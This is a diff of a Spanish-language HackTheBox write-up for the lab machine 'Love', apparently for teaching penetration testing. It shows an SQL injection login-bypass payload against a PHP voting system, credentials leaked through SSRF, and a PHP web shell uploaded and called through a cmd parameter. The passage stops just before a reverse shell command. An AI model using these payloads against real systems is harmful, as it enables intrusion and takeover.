@@ -1,4 +1,7 @@
-10.10.10.239 - Love
+# 10.10.10.239 - Love
+
+![Love](https://user-images.githubusercontent.com/96772264/197388747-319cf1cf-6a22-4e92-aecf-e255da52f783.png)
+
 -------------------
 
 # Parte 1 - Reconocimiento
@@ -37,7 +40,10 @@ Pero intentar bruteforcear la contraseña no da resultado: ```crackmapexec smb 1
 
 -------------------------
 
-Parte 2: Reconocimiento web.
+# Parte 2: Reconocimiento web.
+
+![lovehtb_1](https://user-images.githubusercontent.com/96772264/197388800-902b1bae-7d9a-4ee9-b064-95ab048cdd3a.PNG)
+
 
 Como esto bien decia, la web http://10.10.10.239 / http://love.htb tiene el formulario este de "php voting system"
 Peticion -> POST a /login.php voter=123&password=123&login= PHPSESSID="8uonobi5kr3p0cvm2hir2o2g63"
@@ -48,23 +54,27 @@ Nos ha dado que "Cannot find voter with the ID" cosa que me incita a fuzzear est
 ```
 Pero tras un rato nada.
 
-En la seccion de comentarios hay ```<!-- WARNING: Respond.js doesn't work if you view the page via file:// -->```
-Pero en la ruta "/js/Respond.js"
+En la seccion de comentarios hay ```<!-- WARNING: Respond.js doesn't work if you view the page via file:// -->``` Pero la ruta "/js/Respond.js" da error 404.
 
 Como no he podido fuzzear el Voting System (y para la ruta staging tambien), queda buscarle en el searchsploit.
 ```searchsploit Voting System``` Hay varios para autenticarse mediante SQLI, uno de ellos dice de poner
 ```admin:' or ''='``` a */admin* pero no dio resultado. En cambio otro mas largo si
 ```login=yea&password=admin&username=dsfgdf' UNION SELECT 1,2,"$2y$12$jRwyQyXnktvFrlryHNEhXOeKQYX7/5VK2ZdfB9f/GcJLuPahJWZ9K",4,5,6,7 from INFORMATION_SCHEMA.SCHEMATA;-- -```
 
-Lo del medio que envia parece un formato de hash a juzgar por los "$". 
-Una vez en la web del Voting system tenemos que el usaurio se llama "Neovic Devierte" (puede que nos sirva para
-los otros servicios).
+Lo del medio que envia parece un formato de hash a juzgar por los "$". Una vez en la web del Voting system tenemos que el usaurio se llama "Neovic Devierte" 
+(puede que nos sirva para los otros servicios).
+
+![lovehtb_2](https://user-images.githubusercontent.com/96772264/197388822-dfcecd45-a2bf-449d-b0dc-9a3128dcfebf.PNG)
 
 Hay otro exploit que habla de un file upload en /candidates.php, no esta nada sanitizado, pero si intento subir
 algo me da problemas el campo de *Position*. 
 
+![lovehtb_3](https://user-images.githubusercontent.com/96772264/197388834-55fac078-1160-46fb-90d0-008d2d35d63c.PNG)
+
 En staging.love.htb hay un campo para peticiones.
 Si le pido que se la haga a mi servidor me responde
+
+![lovehtb_4](https://user-images.githubusercontent.com/96772264/197388841-1fa009bb-4a4f-401b-b5ba-febcf8b73caf.PNG)
 
 └─$ sudo python3 -m http.server   
 [sudo] password for cucuxii:
@@ -75,14 +85,17 @@ Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 Pero el php no lo interpreta. 
 Si se lo pido al loscalhost me sale el formulatio del Voting System. Teniamos varias paginas Forbidden.
 
-La web del puerto 443 no me deja verla ```http://127.0.0.1:443 o https://127.0.0.1:443``` Pero la del 5000 si.
-Nos dan las creds "admin:@LoveIsInTheAir!!!!" Con el puerto 80 dichas creds nos llevan a la web de antes (que
-seguimos teniendo problema con subir el Candidato)
+La web del puerto 443 no me deja verla ```http://127.0.0.1:443 o https://127.0.0.1:443``` Pero la del 5000 si. Nos dan las creds "admin:@LoveIsInTheAir!!!!" 
+Con el puerto 80 dichas creds nos llevan a la web de antes (que seguimos teniendo problema con subir el Candidato)
+
+![lovehtb_5](https://user-images.githubusercontent.com/96772264/197388860-915adddc-f7f3-4fc5-8ac4-f873ffa98392.PNG)
 
 Tampoco nos sirven para el smb ni para admin ni para roy.
 
 En la web aparte de subir Candidatos puedes subir Votantes, ahí no hay ningun campo que nos de problemas.
 Subí el cmd.php y en la lista de Votantes me salió la foto (obviamente como es un shell.php no se muestra tal)
+
+![lovehtb6](https://user-images.githubusercontent.com/96772264/197388876-34ff9dc0-cad2-4dbe-9f14-9dcc5051c6ec.PNG)
 
 ¿Pero donde está la backdoor? Como se subió en el campo de *foto*, al darle a *copy image location* 
 ```http://love.htb/images/shell.php?cmd=whoami```
@@ -90,8 +103,6 @@ Subí el cmd.php y en la lista de Votantes me salió la foto (obviamente como es
 Como tenemos ejecucion remota de comandos, ahora solo tenemos que ejecutar una reverse shell (y escuchar por netcat). 
 
 La reverse shell seria esta:
-
-
 
 
 ```console
